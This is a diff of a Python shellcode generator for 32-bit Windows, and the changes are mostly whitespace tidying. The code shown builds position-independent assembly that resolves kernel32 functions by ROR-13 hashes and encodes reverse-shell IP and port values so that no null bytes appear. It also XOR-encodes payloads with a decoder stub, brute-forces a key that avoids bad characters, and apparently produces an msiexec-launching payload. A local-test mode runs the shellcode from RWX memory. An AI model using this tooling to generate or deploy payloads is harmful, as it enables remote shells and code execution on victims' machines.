@@ -38,7 +38,7 @@ def to_sin_ip(ip_address):
     for block in ip_address.split("."):
         # convert each block (ie: 192 -> "c0")
         ip_addr_hex.append(format(int(block), "02x"))
-    # reverse byte order 
+    # reverse byte order
     # (Little Endian), la IP 127.0.0.1 stores as 0x0100007f.
     ip_addr_hex.reverse()
     # returns value
@@ -50,21 +50,21 @@ def to_sin_ip_neg(ip_address):
     ip_addr_hex = []
     for block in ip_address.split("."):
         ip_addr_hex.append(format(int(block), "02x"))
-    
+
     # little endian order
     ip_addr_hex.reverse()
     ip_str = "".join(ip_addr_hex)
     ip_int = int(ip_str, 16)
 
-    # The expected value 0xfeffff81 is the arithmetic negative (two's complement) 
+    # The expected value 0xfeffff81 is the arithmetic negative (two's complement)
     # In Python, we use the 0xFFFFFFFF mask to force 32-bit representation for negative values
     negated_int = (-ip_int) & 0xFFFFFFFF
     negated_hex = format(negated_int, "08x")
-    
+
     # some logs
     print(f"Original IP Hex: 0x{ip_str}")
     print(f"Arithmetic Negation (2's complement): 0x{negated_hex}")
-    
+
     return "0x" + negated_hex
 
 def to_sin_port(port):  # to avoid null bytes
@@ -74,17 +74,17 @@ def to_sin_port(port):  # to avoid null bytes
 def to_sin_port_neg(port): # to avoid null bytes
     # Format to 4 characters hex (16 bits)
     port_hex = format(int(port), "04x")
-    
+
     le_port_str = port_hex[2:4] + port_hex[0:2]
     le_port_int = int(le_port_str, 16)
-    
+
     # Aapply mask 16 bits (0xFFFF)
     negated_int = ~le_port_int & 0xFFFF
     negated_hex = format(negated_int, "04x")
-    
+
     print(f"Original Port (LE): 0x{le_port_str}")
     print(f"Negated Port for ASM: 0x{negated_hex}")
-    
+
     return "0x" + negated_hex
 
 def ror_str(byte, count):
@@ -93,11 +93,11 @@ def ror_str(byte, count):
     binb = numpy.base_repr(byte, 2).zfill(32)
     # bit to bit rotation
     while count > 0:
-        # The last bit (binb[-1]) is moved to the beginning 
+        # The last bit (binb[-1]) is moved to the beginning
         # and concatenated with the rest of the string except for the last bit.
         binb = binb[-1] + binb[0:-1]
         count -= 1
-        
+
     # Returns the result converted back to a decimal integer
     return (int(binb, 2))
 
@@ -106,9 +106,9 @@ def push_function_hash(function_name):
     ror_count = 0
     # iterate for each character (ie: 'W', 'i', 'n', 'E', 'x', 'e'...)
     for eax in function_name:
-        # add up the value 
+        # add up the value
         edx = edx + ord(eax)
-        # If it is not the last character, apply a 13-bit right rotation (0xd) 
+        # If it is not the last character, apply a 13-bit right rotation (0xd)
         # This ensures that each character uniquely affects the final signature
         if ror_count < len(function_name)-1:
             edx = ror_str(edx, 0xd)
@@ -117,7 +117,7 @@ def push_function_hash(function_name):
     return ("push " + hex(edx))
 
 def push_string(input_string, clean_reg="eax", target_reg=None, init_null=True):
-    # alling to 4 bytes with " " to avoid bad chars 
+    # alling to 4 bytes with " " to avoid bad chars
     # before using this check wether " " is a bad byte or not
     padding_len = (4 - (len(input_string) % 4)) % 4
     input_string += " " * padding_len
@@ -165,7 +165,7 @@ def encodeShellcode_pushDecoder(payload_bytes, key_arg, ks_engine):
     for i in range(0, len(payload_aligned), 4):
         block = struct.unpack("<I", payload_aligned[i:i+4])[0]
         encoded_payload += struct.pack("<I", block ^ key)
-    
+
     num_blocks = len(encoded_payload) // 4
     asm = [
         "   start:            ",
@@ -181,13 +181,13 @@ def encodeShellcode_pushDecoder(payload_bytes, key_arg, ks_engine):
         "   get_addr:         ",
         "       call decode  ;",
     ]
-    
+
     try:
         stub_encoding, _ = ks_engine.asm("\n".join(asm))
         return bytearray(stub_encoding) + encoded_payload
     except Exception:
-        return bytearray() 
-    
+        return bytearray()
+
 def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     push_instr_terminate_hash = push_function_hash("TerminateProcess")
     push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
@@ -413,97 +413,97 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;", 
-        "       add esp, 0xfffff9f0             ;", 
+        "       mov ebp, esp                    ;",
+        "       add esp, 0xfffff9f0             ;",
         "   find_kernel32:                       ",
-        "       xor ecx,ecx                     ;", 
-        "       mov esi,fs:[ecx+30h]            ;", 
-        "       mov esi,[esi+0Ch]               ;", 
-        "       mov esi,[esi+1Ch]               ;", 
+        "       xor ecx,ecx                     ;",
+        "       mov esi,fs:[ecx+30h]            ;",
+        "       mov esi,[esi+0Ch]               ;",
+        "       mov esi,[esi+1Ch]               ;",
         "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;", 
-        "       mov edi, [esi+20h]              ;", 
-        "       mov esi, [esi]                  ;", 
-        "       cmp [edi+12*2], cx              ;", 
-        "       jne next_module                 ;", 
+        "       mov ebx, [esi+8h]               ;",
+        "       mov edi, [esi+20h]              ;",
+        "       mov esi, [esi]                  ;",
+        "       cmp [edi+12*2], cx              ;",
+        "       jne next_module                 ;",
         "   find_function_shorten:               ",
-        "       jmp find_function_shorten_bnc   ;", 
+        "       jmp find_function_shorten_bnc   ;",
         "   find_function_ret:                   ",
-        "       pop esi                         ;", 
-        "       mov [ebp+0x04], esi             ;", 
-        "       jmp resolve_symbols_kernel32    ;", 
+        "       pop esi                         ;",
+        "       mov [ebp+0x04], esi             ;",
+        "       jmp resolve_symbols_kernel32    ;",
         "   find_function_shorten_bnc:           ",
-        "       call find_function_ret          ;", 
+        "       call find_function_ret          ;",
         "   find_function:                       ",
-        "       pushad                          ;", 
-        "       mov eax, [ebx+0x3c]             ;", 
-        "       mov edi, [ebx+eax+0x78]         ;", 
-        "       add edi, ebx                    ;", 
-        "       mov ecx, [edi+0x18]             ;", 
-        "       mov eax, [edi+0x20]             ;", 
-        "       add eax, ebx                    ;", 
-        "       mov [ebp-4], eax                ;", 
+        "       pushad                          ;",
+        "       mov eax, [ebx+0x3c]             ;",
+        "       mov edi, [ebx+eax+0x78]         ;",
+        "       add edi, ebx                    ;",
+        "       mov ecx, [edi+0x18]             ;",
+        "       mov eax, [edi+0x20]             ;",
+        "       add eax, ebx                    ;",
+        "       mov [ebp-4], eax                ;",
         "   find_function_loop:                  ",
-        "       jecxz find_function_finished    ;", 
-        "       dec ecx                         ;", 
-        "       mov eax, [ebp-4]                ;", 
-        "       mov esi, [eax+ecx*4]            ;", 
-        "       add esi, ebx                    ;", 
+        "       jecxz find_function_finished    ;",
+        "       dec ecx                         ;",
+        "       mov eax, [ebp-4]                ;",
+        "       mov esi, [eax+ecx*4]            ;",
+        "       add esi, ebx                    ;",
         "   compute_hash:                        ",
-        "       xor eax, eax                    ;", 
-        "       cdq                             ;", 
-        "       cld                             ;", 
+        "       xor eax, eax                    ;",
+        "       cdq                             ;",
+        "       cld                             ;",
         "   compute_hash_again:                  ",
-        "       lodsb                           ;", 
-        "       test al, al                     ;", 
-        "       jz compute_hash_finished        ;", 
-        "       ror edx, 0x0d                   ;", 
-        "       add edx, eax                    ;", 
-        "       jmp compute_hash_again          ;", 
+        "       lodsb                           ;",
+        "       test al, al                     ;",
+        "       jz compute_hash_finished        ;",
+        "       ror edx, 0x0d                   ;",
+        "       add edx, eax                    ;",
+        "       jmp compute_hash_again          ;",
         "   compute_hash_finished:               ",
         "   find_function_compare:               ",
-        "       cmp edx, [esp+0x24]             ;", 
-        "       jnz find_function_loop          ;", 
-        "       mov edx, [edi+0x24]             ;", 
-        "       add edx, ebx                    ;", 
-        "       mov cx, [edx+2*ecx]             ;", 
-        "       mov edx, [edi+0x1c]             ;", 
-        "       add edx, ebx                    ;", 
-        "       mov eax, [edx+4*ecx]            ;", 
-        "       add eax, ebx                    ;", 
-        "       mov [esp+0x1c], eax             ;", 
+        "       cmp edx, [esp+0x24]             ;",
+        "       jnz find_function_loop          ;",
+        "       mov edx, [edi+0x24]             ;",
+        "       add edx, ebx                    ;",
+        "       mov cx, [edx+2*ecx]             ;",
+        "       mov edx, [edi+0x1c]             ;",
+        "       add edx, ebx                    ;",
+        "       mov eax, [edx+4*ecx]            ;",
+        "       add eax, ebx                    ;",
+        "       mov [esp+0x1c], eax             ;",
         "   find_function_finished:              ",
-        "       popad                           ;", 
-        "       ret                             ;", 
+        "       popad                           ;",
+        "       ret                             ;",
         "   resolve_symbols_kernel32:            ",
-        push_instr_terminate_hash,                   
-        "       call dword ptr [ebp+0x04]       ;", 
-        "       mov [ebp+0x10], eax             ;", 
-        push_instr_loadlibrarya_hash,                
-        "       call dword ptr [ebp+0x04]       ;", 
-        "       mov [ebp+0x14], eax             ;", 
+        push_instr_terminate_hash,
+        "       call dword ptr [ebp+0x04]       ;",
+        "       mov [ebp+0x10], eax             ;",
+        push_instr_loadlibrarya_hash,
+        "       call dword ptr [ebp+0x04]       ;",
+        "       mov [ebp+0x14], eax             ;",
         "   load_msvcrt:                         ",
         "       xor eax, eax                    ;", # \0
-        "       push eax                        ;", 
+        "       push eax                        ;",
         push_instr_msvcrt,                          # msvcrt.dll
-        "       push+ esp                        ;", 
-        "       call dword ptr [ebp+0x14]       ;", 
+        "       push esp                        ;",
+        "       call dword ptr [ebp+0x14]       ;",
         "   resolve_symbols_msvcrt:              ",
-        "       mov ebx, eax                    ;", 
-        push_instr_system_hash,                      
-        "       call dword ptr [ebp+0x04]       ;", 
-        "       mov [ebp+0x18], eax             ;", 
+        "       mov ebx, eax                    ;",
+        push_instr_system_hash,
+        "       call dword ptr [ebp+0x04]       ;",
+        "       mov [ebp+0x18], eax             ;",
         "   call_system:                         ",
-        "       xor eax, eax                    ;", 
+        "       xor eax, eax                    ;",
         "       push eax                        ;",
         push_instr_msi,
-        "       push esp                        ;", 
-        "       call dword ptr [ebp+0x18]       ;", 
+        "       push esp                        ;",
+        "       call dword ptr [ebp+0x18]       ;",
         "   exec_shellcode:                      ",
-        "       xor ecx, ecx                    ;", 
-        "       push ecx                        ;", 
-        "       push 0xffffffff                 ;", 
-        "       call dword ptr [ebp+0x10]       ;", 
+        "       xor ecx, ecx                    ;",
+        "       push ecx                        ;",
+        "       push 0xffffffff                 ;",
+        "       call dword ptr [ebp+0x10]       ;",
     ]
     return "\n".join(asm)
 
@@ -518,106 +518,106 @@ def msg_box(header, text, breakpoint=0):
     asm = [
         "   start:                               ",
         f"{['', 'int3;'][breakpoint]}            ",
-        "       mov ebp, esp                    ;", 
-        "       add esp, 0xfffff9f0             ;", 
+        "       mov ebp, esp                    ;",
+        "       add esp, 0xfffff9f0             ;",
         "   find_kernel32:                       ",
-        "       xor ecx,ecx                     ;", 
-        "       mov esi,fs:[ecx+30h]            ;", 
-        "       mov esi,[esi+0Ch]               ;", 
-        "       mov esi,[esi+1Ch]               ;", 
+        "       xor ecx,ecx                     ;",
+        "       mov esi,fs:[ecx+30h]            ;",
+        "       mov esi,[esi+0Ch]               ;",
+        "       mov esi,[esi+1Ch]               ;",
         "   next_module:                         ",
-        "       mov ebx, [esi+8h]               ;", 
-        "       mov edi, [esi+20h]              ;", 
-        "       mov esi, [esi]                  ;", 
-        "       cmp [edi+12*2], cx              ;", 
-        "       jne next_module                 ;", 
+        "       mov ebx, [esi+8h]               ;",
+        "       mov edi, [esi+20h]              ;",
+        "       mov esi, [esi]                  ;",
+        "       cmp [edi+12*2], cx              ;",
+        "       jne next_module                 ;",
         "   find_function_shorten:               ",
-        "       jmp find_function_shorten_bnc   ;", 
+        "       jmp find_function_shorten_bnc   ;",
         "   find_function_ret:                   ",
-        "       pop esi                         ;", 
-        "       mov [ebp+0x04], esi             ;", 
-        "       jmp resolve_symbols_kernel32    ;", 
+        "       pop esi                         ;",
+        "       mov [ebp+0x04], esi             ;",
+        "       jmp resolve_symbols_kernel32    ;",
         "   find_function_shorten_bnc:           ",
-        "       call find_function_ret          ;", 
+        "       call find_function_ret          ;",
         "   find_function:                       ",
-        "       pushad                          ;", 
-        "       mov eax, [ebx+0x3c]             ;", 
-        "       mov edi, [ebx+eax+0x78]         ;", 
-        "       add edi, ebx                    ;", 
-        "       mov ecx, [edi+0x18]             ;", 
-        "       mov eax, [edi+0x20]             ;", 
-        "       add eax, ebx                    ;", 
-        "       mov [ebp-4], eax                ;", 
+        "       pushad                          ;",
+        "       mov eax, [ebx+0x3c]             ;",
+        "       mov edi, [ebx+eax+0x78]         ;",
+        "       add edi, ebx                    ;",
+        "       mov ecx, [edi+0x18]             ;",
+        "       mov eax, [edi+0x20]             ;",
+        "       add eax, ebx                    ;",
+        "       mov [ebp-4], eax                ;",
         "   find_function_loop:                  ",
-        "       jecxz find_function_finished    ;", 
-        "       dec ecx                         ;", 
-        "       mov eax, [ebp-4]                ;", 
-        "       mov esi, [eax+ecx*4]            ;", 
-        "       add esi, ebx                    ;", 
+        "       jecxz find_function_finished    ;",
+        "       dec ecx                         ;",
+        "       mov eax, [ebp-4]                ;",
+        "       mov esi, [eax+ecx*4]            ;",
+        "       add esi, ebx                    ;",
         "   compute_hash:                        ",
-        "       xor eax, eax                    ;", 
-        "       cdq                             ;", 
-        "       cld                             ;", 
+        "       xor eax, eax                    ;",
+        "       cdq                             ;",
+        "       cld                             ;",
         "   compute_hash_again:                  ",
-        "       lodsb                           ;", 
-        "       test al, al                     ;", 
-        "       jz compute_hash_finished        ;", 
-        "       ror edx, 0x0d                   ;", 
-        "       add edx, eax                    ;", 
-        "       jmp compute_hash_again          ;", 
+        "       lodsb                           ;",
+        "       test al, al                     ;",
+        "       jz compute_hash_finished        ;",
+        "       ror edx, 0x0d                   ;",
+        "       add edx, eax                    ;",
+        "       jmp compute_hash_again          ;",
         "   compute_hash_finished:               ",
         "   find_function_compare:               ",
-        "       cmp edx, [esp+0x24]             ;", 
-        "       jnz find_function_loop          ;", 
-        "       mov edx, [edi+0x24]             ;", 
-        "       add edx, ebx                    ;", 
-        "       mov cx, [edx+2*ecx]             ;", 
-        "       mov edx, [edi+0x1c]             ;", 
-        "       add edx, ebx                    ;", 
-        "       mov eax, [edx+4*ecx]            ;", 
-        "       add eax, ebx                    ;", 
-        "       mov [esp+0x1c], eax             ;", 
+        "       cmp edx, [esp+0x24]             ;",
+        "       jnz find_function_loop          ;",
+        "       mov edx, [edi+0x24]             ;",
+        "       add edx, ebx                    ;",
+        "       mov cx, [edx+2*ecx]             ;",
+        "       mov edx, [edi+0x1c]             ;",
+        "       add edx, ebx                    ;",
+        "       mov eax, [edx+4*ecx]            ;",
+        "       add eax, ebx                    ;",
+        "       mov [esp+0x1c], eax             ;",
         "   find_function_finished:              ",
-        "       popad                           ;", 
-        "       ret                             ;", 
+        "       popad                           ;",
+        "       ret                             ;",
         "   resolve_symbols_kernel32:            ",
-        push_instr_terminate_hash,                   
-        "       call dword ptr [ebp+0x04]       ;", 
-        "       mov [ebp+0x10], eax             ;", 
-        push_instr_loadlibrarya_hash,                
-        "       call dword ptr [ebp+0x04]       ;", 
-        "       mov [ebp+0x14], eax             ;", 
+        push_instr_terminate_hash,
+        "       call dword ptr [ebp+0x04]       ;",
+        "       mov [ebp+0x10], eax             ;",
+        push_instr_loadlibrarya_hash,
+        "       call dword ptr [ebp+0x04]       ;",
+        "       mov [ebp+0x14], eax             ;",
         "   load_user32:                         ",
-        "       xor eax, eax                    ;", 
-        "       push eax                        ;", 
-       push_instr_user32,                              
-        "       push esp                        ;", 
-        "       call dword ptr [ebp+0x14]       ;", 
+        "       xor eax, eax                    ;",
+        "       push eax                        ;",
+       push_instr_user32,
+        "       push esp                        ;",
+        "       call dword ptr [ebp+0x14]       ;",
         "   resolve_symbols_user32:              ",
-        "       mov ebx, eax                    ;", 
-        push_instr_msgbox_hash,                      
-        "       call dword ptr [ebp+0x04]       ;", 
-        "       mov [ebp+0x18], eax             ;", 
+        "       mov ebx, eax                    ;",
+        push_instr_msgbox_hash,
+        "       call dword ptr [ebp+0x04]       ;",
+        "       mov [ebp+0x18], eax             ;",
         "   call_system:                         ",
-        "       xor eax, eax                    ;", 
-        "       push eax                        ;", 
-        push_instr_header,                           
-        "       mov ebx, esp                    ;", 
-        "       xor eax, eax                    ;", 
-        "       push eax                        ;", 
-        push_instr_text,                             
-        "       mov ecx, esp                    ;", 
-        "       xor eax, eax                    ;", 
-        "       push eax                        ;", 
-        "       push ebx                        ;", 
-        "       push ecx                        ;", 
-        "       push eax                        ;", 
-        "       call dword ptr [ebp+0x18]       ;", 
+        "       xor eax, eax                    ;",
+        "       push eax                        ;",
+        push_instr_header,
+        "       mov ebx, esp                    ;",
+        "       xor eax, eax                    ;",
+        "       push eax                        ;",
+        push_instr_text,
+        "       mov ecx, esp                    ;",
+        "       xor eax, eax                    ;",
+        "       push eax                        ;",
+        "       push ebx                        ;",
+        "       push ecx                        ;",
+        "       push eax                        ;",
+        "       call dword ptr [ebp+0x18]       ;",
         "   exec_shellcode:                      ",
-        "       xor ecx, ecx                    ;", 
-        "       push ecx                        ;", 
-        "       push 0xffffffff                 ;", 
-        "       call dword ptr [ebp+0x10]       ;", 
+        "       xor ecx, ecx                    ;",
+        "       push ecx                        ;",
+        "       push 0xffffffff                 ;",
+        "       call dword ptr [ebp+0x10]       ;",
     ]
     return "\n".join(asm)
 
@@ -625,38 +625,38 @@ def check_and_disassemble(encoding, bad_bytes):
     print(f"\n[!] {Fore.RED}BAD CHARACTERS DETECTED! Analyzing context...{Style.RESET_ALL}\n")
     md = Cs(CS_ARCH_X86, CS_MODE_32)
     bytecode = bytes(encoding)
-    instructions = list(md.disasm(bytecode, 0x00))    
+    instructions = list(md.disasm(bytecode, 0x00))
     # index of instructions with bad chars
     bad_indices = []
     for idx, ins in enumerate(instructions):
         if any(b in bad_bytes for b in ins.bytes):
             bad_indices.append(idx)
-            
+
     if not bad_indices:
         return # Should not happen if we are here
-        
+
     CONTEXT_SIZE = 3
     lines_to_show = set()
-    
+
     for bad_idx in bad_indices:
         start = max(0, bad_idx - CONTEXT_SIZE)
         end = min(len(instructions), bad_idx + CONTEXT_SIZE + 1)
         for i in range(start, end):
             lines_to_show.add(i)
-            
+
     sorted_lines = sorted(list(lines_to_show))
-    
+
     last_line_idx = -1
-    
+
     for idx in sorted_lines:
         ins = instructions[idx]
-        
+
         # separator check if there is a large gap between contexts
         if last_line_idx != -1 and idx > last_line_idx + 1:
             print(f"{Style.DIM}   ... [SKIPPING {idx - last_line_idx - 1} INSTRUCTIONS] ...{Style.RESET_ALL}")
 
         is_bad_ins = idx in bad_indices
-        
+
         byte_str_list = []
         for b in ins.bytes:
             if b in bad_bytes:
@@ -681,7 +681,7 @@ def check_and_disassemble(encoding, bad_bytes):
             arrow = ""
 
         print(f"{addr_str} {padded_bytes}  {mnemonic_str} {arrow}")
-        
+
         last_line_idx = idx
 
     print(f"\n[!] {Fore.RED}Fix the instructions marked above to proceed.{Style.RESET_ALL}")
@@ -710,21 +710,21 @@ def main(args):
     except ks.KsError as e:
         print(f"{Fore.RED}[!] Error compiling shellcode: {e}{Style.RESET_ALL}")
         sys.exit(1)
-    
-    final_shellcode = encoding 
-    
+
+    final_shellcode = encoding
+
     if args.key:
         initial_key = int(args.key, 16) if args.key.startswith("0x") else int(args.key)
         current_key = initial_key
         attempts = 0
         max_attempts = 1000000
-        
+
         print(f"[*] Searching for a clean key starting from {hex(initial_key)}...")
 
         while attempts < max_attempts:
             candidate = encodeShellcode_pushDecoder(encoding, hex(current_key), eng)
             found_bad = [b for b in candidate if b in bad_ints]
-            
+
             if not found_bad:
                 print(f"\n[+] {Fore.GREEN}SUCCESS!{Style.RESET_ALL}")
                 print(f"[+] Clean key found: {Fore.YELLOW}{hex(current_key)}{Style.RESET_ALL}")
@@ -734,7 +734,7 @@ def main(args):
             else:
                 current_key = (current_key + 1) & 0xFFFFFFFF
                 attempts += 1
-        
+
         if attempts == max_attempts:
             print(f"\n{Fore.RED}[!] FATAL: No clean key found after {max_attempts} attempts.{Style.RESET_ALL}")
             print("[!] The bad chars might be present in the static parts of your decoder stub.")
@@ -754,7 +754,7 @@ def main(args):
     print(f"[=]   Payload len:   {len(encoding)} bytes")
     print(f"[=]   Total len:     {len(final_shellcode)} bytes (inc. decoder)")
     print(f"[=]   LHOST/LPORT:   {args.lhost}:{args.lport}")
-    
+
     print("\n" + final_hex + "\n")
 
     # debug
@@ -762,23 +762,23 @@ def main(args):
         if (struct.calcsize("P")*8) == 32:
             print(f"[*] Starting local test (VirtualAlloc + CreateThread)...")
             packed_shellcode = bytearray(final_shellcode)
-            
+
             # (0x40 = PAGE_EXECUTE_READWRITE)
             ptr = ctypes.windll.kernel32.VirtualAlloc(
                 ctypes.c_int(0),
                 ctypes.c_int(len(packed_shellcode)),
                 ctypes.c_int(0x3000), # MEM_COMMIT | MEM_RESERVE
-                ctypes.c_int(0x40),  
+                ctypes.c_int(0x40),
             )
-            
+
             buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(packed_shellcode)
             ctypes.windll.kernel32.RtlMoveMemory(
                 ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
             )
-            
+
             print(f"[+] Shellcode mapped at: {hex(ptr)}")
             input("[?] Press ENTER to execute...")
-            
+
             ht = ctypes.windll.kernel32.CreateThread(
                 ctypes.c_int(0), 0, ctypes.c_int(ptr), 0, 0, ctypes.pointer(ctypes.c_int(0))
             )
@@ -802,6 +802,6 @@ if __name__ == "__main__":
     parser.add_argument("-d", "--debug-break", help="add a software breakpoint as the first shellcode instruction", action="store_true")
     parser.add_argument("-t", "--test-shellcode", help="test the shellcode on the system", action="store_true")
     parser.add_argument("-s", "--store-shellcode", help="store the shellcode in binary format in the file shellcode.bin", action="store_true")
-    
+
     args = parser.parse_args()
     main(args)
